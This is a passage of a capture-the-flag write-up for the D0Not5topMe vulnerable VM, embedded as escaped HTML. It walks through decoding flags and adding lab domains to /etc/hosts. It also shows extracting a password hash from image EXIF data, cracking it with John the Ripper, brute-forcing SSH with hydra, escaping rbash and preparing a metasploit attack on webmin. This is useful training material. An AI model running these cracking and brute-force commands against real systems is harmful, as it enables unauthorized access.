+  Don't think he's quite in the 20n3 these days since his MadBro made that 7r4n5f3r, Just Couldnt H@cxk Da D0Not5topMe.ctf --!&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now, as I've tried to look in every diretory possible, I've found that in the &lt;b&gt;/control/js&lt;/b&gt; folder was the file called &lt;b&gt;README.MadBro&lt;/b&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;  ###########################################################
+  # MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
+  # M4K3 5UR3 2 S3TUP Y0UR /3TC/H05T5 N3XT T1M3 L0053R...   #
+  # 1T'5 D0Not5topMe.ctf !!!!                               #
+  # 1M 00T4 H33R..                                          #
+  # MadBro MadBro MadBro MadBro MadBro MadBro MadBro MadBro #
+  ###########################################################
+
+                  FL101110_10:111101011101
+                  1r101010q10svdfsxk1001i1
+                  11ry100f10srtr1100010h10                &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Flag in binary? Let's decode it. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FL46_2:39331r42q2svdfsxk9i13ry4f2srtr98h2&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now let's come back to the clue. We have to setup &lt;b&gt;/etc/hosts&lt;/b&gt;? In the left column of the file is IP address of our machine, and in the right the domain name.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;127.0.0.1       localhost
+127.0.1.1       kali
+10.0.2.8       D0Not5topMe.ctf
+
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And we are ready to reset the network interface, and access the site. &lt;/p&gt;
+
+&lt;h1&gt;D0Not5topMe.ctf&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/forum.png&quot; alt=&quot;forum&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;PhpBB&lt;/b&gt; forum. The message in the homepage seems to be &lt;b&gt;pig latin&lt;/b&gt;. After simple translation, we got the message. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;emay ayingplay uchmay amesgay ownay egistrarioray arnay edsay emay emailway ayay egustomay otay indfay away eomay ideyhohay
+me playing much games now registrario rna sed me wemail a megusto to find wa meo hideyho&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Okay, so we have to register. I tried doing it with different accounts, playing with options ,but none of them seemed to lead me to the solution. After a while, I found that after not agreeing with terms, website will send a &lt;b&gt;POST&lt;/b&gt; request, with some fancy paramteres. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/donotagree.png&quot; alt=&quot;donotagree&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;See this string &lt;b&gt;FLaR6yF1nD3rZ_html&lt;/b&gt;? Let's jump to that. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-brainfuck&quot; data-lang=&quot;brainfuck&quot;&gt;+++++ +++[- &amp;gt;++++ ++++&amp;lt; ]&amp;gt;+++ +++.+ +++++ .&amp;lt;+++ +[-&amp;gt;- ---&amp;lt;] &amp;gt;---- ----.
+++.&amp;lt;+ +++++ [-&amp;gt;++ ++++&amp;lt; ]&amp;gt;+++ ++.&amp;lt;+ +++++ [-&amp;gt;-- ----&amp;lt; ]&amp;gt;--- ----. +++++
++.&amp;lt;++ +++++ [-&amp;gt;++ +++++ &amp;lt;]&amp;gt;++ +.&amp;lt;++ +++++ [-&amp;gt;-- ----- &amp;lt;]&amp;gt;-- ----- -----
+-.++. &amp;lt;++++ ++[-&amp;gt; +++++ +&amp;lt;]&amp;gt;+ +++++ +++++ +.&amp;lt;++ ++[-&amp;gt; ++++&amp;lt; ]&amp;gt;+++ +.&amp;lt;++
++++++ +[-&amp;gt;- ----- --&amp;lt;]&amp;gt; ----- .&amp;lt;+++ +++++ [-&amp;gt;++ +++++ +&amp;lt;]&amp;gt;+ .++++ ++.&amp;lt;+
++++++ ++[-&amp;gt; ----- ---&amp;lt;] &amp;gt;---. &amp;lt;++++ +++[- &amp;gt;++++ +++&amp;lt;] &amp;gt;++++ +++++ ++++.
+&amp;lt;+++[ -&amp;gt;--- &amp;lt;]&amp;gt;-- ---.&amp;lt; +++++ ++[-&amp;gt; ----- --&amp;lt;]&amp;gt; .+.+. ----- -.+++ +++++
++.-.- ---.&amp;lt; +++++ ++[-&amp;gt; +++++ ++&amp;lt;]&amp;gt; ..-.- .++++ +.++. +++++ ++++. &amp;lt;++++
++++[- &amp;gt;---- ---&amp;lt;] &amp;gt;---- ----- --.-- ---.&amp;lt; +++++ ++[-&amp;gt; +++++ ++&amp;lt;]&amp;gt; +++++
+.&amp;lt;+++ [-&amp;gt;++ +&amp;lt;]&amp;gt;+ +.++. --.++ .&amp;lt;+++ ++++[ -&amp;gt;--- ----&amp;lt; ]&amp;gt;--- ----- ---.&amp;lt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Looks like &lt;b&gt;brainfuck&lt;/b&gt;. After compiling it, we got another flag! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;FL46_4:n02bv1rx5se4560984eedchjs72hsusu9&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Still, it didn't lead me anywhere near the end. At this time, I decided to take a look at possible SQL injections where I've found something interesting. Changing the URL, resulted in showing an error message. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;http://d0not5topme.ctf/ucp.php?sid=f22e8d906dbe2b481bb7f30522b7e7a0&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;i=hithere&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Together with this message was the e-mail address. Will it be another domain to enter in &lt;b&gt;/etc/hosts&lt;/b&gt;? &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/error.png&quot; alt=&quot;error&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let's try that. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;127.0.0.1       localhost
+127.0.1.1       kali
+10.0.2.8        D0Not5topMe.ctf
+10.0.2.8        G4M35.ctf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And now we can direct our browser to that site. &lt;/p&gt;
+
+&lt;h1&gt;G4M35.ctf&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/game.png&quot; alt=&quot;game&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It's a game and it's pretty good one. Or maybe it's my lack of games, who really knows... Anyway, it was fun little break, but after losing I got another hint. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/death.png&quot; alt=&quot;death&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Another directory and another game, awesome!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/game-2.png&quot; alt=&quot;game-2&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After playing for a while, I noticed a strange texture in the background. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/texture.png&quot; alt=&quot;texture&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Typing it down got us another flag! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;\106\114\64\66\137\65\72\60\71\153\70\67\150\66\147\64\145\62\65\147\150\64\64\167\141\61\162\171\142\171\146\151\70\71\70\150\156\143\144\165
+FL46_5:09K87H6G4E25GH44WA1RYBYFI898HNCDU&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Two more to go! After playing a bit more, and finishing it, I got another domain to add -  this time &lt;b&gt;t3rm1n4l.ctf&lt;/b&gt;. We can once again add this to &lt;b&gt;/etc/hosts&lt;/b&gt;. &lt;/p&gt;
+
+&lt;h1&gt;T3rm1n4l.ctf&lt;/h1&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/terminal.png&quot; alt=&quot;terminal&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It's a terminal, but what's the password? Luckily, after some tries, I typed &lt;b&gt;t3rm1n4l.ctf&lt;/b&gt; and it works! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;t3rm1n4l.ctf Passwordo Requireo:
+t3rm1n4l.ctf
+AUTHENTICO!
+&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+/usr/share/nginx/html
+dir
+t3rm1n4l.ctf Passwordo Requireo:
+t3rm1n4l.ctf
+AUTHENTICO!
+dir
+ERROR: Megusto ere no no!
+id
+t3rm1n4l.ctf Passwordo Requireo:
+t3rm1n4l.ctf
+AUTHENTICO!
+id
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+grep &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+t3rm1n4l.ctf Passwordo Requireo:
+t3rm1n4l.ctf
+AUTHENTICO!
+grep &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+grep: BBBBBBBBBBB: Is a directory
+grep: CCCCCCCCCCC: Is a directory
+grep: M36u574.ctf: Is a directory
+grep: XXXXXXXXXXX: Is a directory
+grep: YYYYYYYYYYY: Is a directory
+grep: ZZZZZZZZZZZ: Is a directory&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And another long journey through typing different commands. I've found that &lt;b&gt;grep&lt;/b&gt; command works, and now we have another domain to collect. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;127.0.0.1       localhost
+127.0.1.1       kali
+10.0.2.8        D0Not5topMe.ctf
+10.0.2.8        G4M35.ctf
+10.0.2.8        t3rm1n4l.ctf
+10.0.2.8        M36u574.ctf&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;M36u574.ctf&lt;/h1&gt;
+
+&lt;p&gt;This page was... It was a slideshow of different megusta memes. As nothing was in the source code, I decided to take a look at the images - maybe they are hiding something. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/d0not5top/kingmegusta.jpg&quot; alt=&quot;kingmegusta&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Yeah, this image, I knew it was hiding something! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;exiftool kingmegusta.jpg
+MeGustaKing:&lt;span class=&quot;nv&quot;&gt;$6$e1&lt;/span&gt;.2NcUo&lt;span class=&quot;nv&quot;&gt;$96SfkpUHG25LFZfA5AbJVZjtD4fs6fGetDdeSA9HRpbkDw6y5nauwMwRNPxQnydsLzQGvYOU84B2nY&lt;/span&gt;/O40pZ30&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Username and password pair, now we only have to crack it. &lt;b&gt;JohnTheRipper&lt;/b&gt; should be ablo to do it without any problems. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;john --wordlist:/usr/share/wordlists/rockyou.txt pass
+Created directory: /root/.john
+Warning: detected &lt;span class=&quot;nb&quot;&gt;hash type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sha512crypt&quot;&lt;/span&gt;, but the string is also recognized as &lt;span class=&quot;s2&quot;&gt;&quot;crypt&quot;&lt;/span&gt;
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--format=crypt&quot;&lt;/span&gt; option to force loading these as that &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;instead
+Using default input encoding: UTF-8
+Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$6$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;SHA512 128/128 AVX 2x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
+&lt;span class=&quot;k&quot;&gt;**********&lt;/span&gt;       &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+1g 0:00:00:38 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2017-06-09 06:51&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.02625g/s 574.6p/s 574.6c/s 574.6C/s 101207..shayneward
+Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h1&gt;SSH&lt;/h1&gt;
+
+&lt;p&gt;This is the password? Really? Moving on, we should be able to login to &lt;b&gt;ssh&lt;/b&gt; using these credentials. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;ssh MeGustaKing@10.0.2.8
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;'10.0.2.8 (10.0.2.8)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
+ECDSA key fingerprint is SHA256:mAxp6psDamyOxr81/mYUZPkIk2s+EDdyz1+RkRFLSUM.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '&lt;/span&gt;10.0.2.8&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
+MeGustaKing@10.0.2.8'&lt;/span&gt;s password:
+ERROR!
+TRACE: sshPr0xy.py line:550 &amp;lt;CODE&amp;gt;U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&amp;lt;/CODE&amp;gt;
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;each program are described &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the
+individual files &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /usr/share/doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+
+Last login:Sat Apr  1 00:00:01 2017 from R0cKy0U.7x7
+Welcome to rush shell
+Lets you update your FunNotes and more!
+
+Uh0h.. u n0 burtieo
+h35 da 54wltyD4w6 y0u...
+Gw04w4y :&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
+Local configuration error occurred.
+Contact the systems administrator &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;further assistance.
+Connection to 10.0.2.8 closed.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Unfortunately, we didn't have a chance to type commands but we got this base64 encrypted string. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;U2FsdGVkX1/vv715OGrvv73vv73vv71Sa3cwTmw4Mk9uQnhjR1F5YW1adU5ISjFjVEZ2WW5
+&amp;gt; sMk0zUm9kemcwT0hSbE5qZDBaV3BsZVNBS++/ve+/ve+/vWnvv704OCQmCg==&quot;&lt;/span&gt; | base64 -d
+Salted__�y8j���Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK���i�88&lt;span class=&quot;nv&quot;&gt;$&amp;amp;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Rkw0Nl82OnBxcGQyamZuNHJ1cTFvYnl2M3Rodzg0OHRlNjd0ZWpleSAK&quot;&lt;/span&gt; | base64 -d
+FL46_6:pqpd2jfn4ruq1obyv3thw848te67tejey&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;One more to go! But after looking even more at the &lt;b&gt;ssh&lt;/b&gt; connection I found that this string may be a clue - &lt;b&gt;Uh0h.. u n0 burtieo&lt;/b&gt;. Is this username? If yes, we can try to crack it using &lt;b&gt;hydra&lt;/b&gt; and &lt;b&gt;rockyou.txt&lt;/b&gt; wordlist.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents# &lt;/span&gt;hydra -l burtieo -P /usr/share/wordlists/rockyou.txt 10.0.2.8 ssh
+Hydra v8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2014 by van Hauser/THC - Please &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;military or secret service organizations, or &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;illegal purposes.
+
+Hydra &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; starting at 2017-06-09 06:57:53
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;l:1/p:14344399&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, ~14008 tries per task
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DATA] attacking service ssh on port 22
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 160.00 tries/min, 160 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:01h, 14344239 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1494:12h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 117.33 tries/min, 352 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00:03h, 14344047 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2037:31h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 96.25 tries/min, 18384 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;03:11h, 14326015 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2480:40h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 96.23 tries/min, 19920 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;03:27h, 14324479 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2480:54h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 96.22 tries/min, 21456 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;03:43h, 14322943 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2481:04h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;STATUS] 96.20 tries/min, 22992 tries &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;03:59h, 14321407 todo &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;2481:10h, 16 active
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ssh] host: 192.168.190.132 login: burtieo password: Lets you update your FunNotes and more!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Another troll :/ Let's log in once more using these credentials. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;W2wC0m3 Bw3rtie0 :&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;burtieo@D0Not5top:~$ &lt;/span&gt;ls
+-rbash: ls: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
+&lt;span class=&quot;gp&quot;&gt;burtieo@D0Not5top:~$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+/home/burtie
+&lt;span class=&quot;gp&quot;&gt;burtieo@D0Not5top:~$ &lt;/span&gt;id
+-rbash: id: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found
+&lt;span class=&quot;gp&quot;&gt;burtieo@D0Not5top:~$ &lt;/span&gt;cat
+-rbash: cat: &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;not found&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It's an &lt;b&gt;rbash&lt;/b&gt;, and I'm not able to run mostly  any of the commands. After huge amount of trying different methods, enumerating, trying to break from the rbash, I gave up and with a little help found this command. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;burtieo@D0Not5top:~$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;suedoh -l&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+suedoh: unable to resolve host D0Not5top
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;burtieo on D0Not5top: env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin User burtieo may run the following commands on D0Not5top: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/wmstrt
+&lt;span class=&quot;gp&quot;&gt;burtieo@D0Not5top:~$ &lt;/span&gt;suedoh /usr/bin/wmstrt
+    D1dyaCatchaT3nK1l0?
+    :D&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Running &lt;b&gt;suedoh /usr/bin/wmstrt&lt;/b&gt; opens another port, which we checked using &lt;b&gt;Nmap&lt;/b&gt;.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap 10.0.2.8
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-06-09 14:15 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;D0Not5topMe.ctf &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.0.2.8&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 994 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+25/tcp    open  smtp
+53/tcp    open  domain
+80/tcp    open  http
+111/tcp   open  rpcbind
+10000/tcp open  snet-sensor-mgmt
+MAC Address: 08:00:27:58:A4:C4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.30 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As it's open only for certain amount of time, I decided to run a simple loop, that will keep this port open. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;burtieo@D0Not5top:~$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1..99999..1&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;suedoh /usr/bin/wmstrt&amp;amp;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;;&lt;span class=&quot;k&quot;&gt;done
+&lt;/span&gt;suedoh: unable to resolve host D0Not5top&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now what is &lt;b&gt;snet-sensor-mgmt&lt;/b&gt;? Googling that name gave us simple tip - it can be &lt;b&gt;webmin&lt;/b&gt; instance. We can try to attack it using &lt;b&gt;metasploit&lt;/b&gt;, but firstly, let's find an proper exploit. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~# msfconsole
+
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
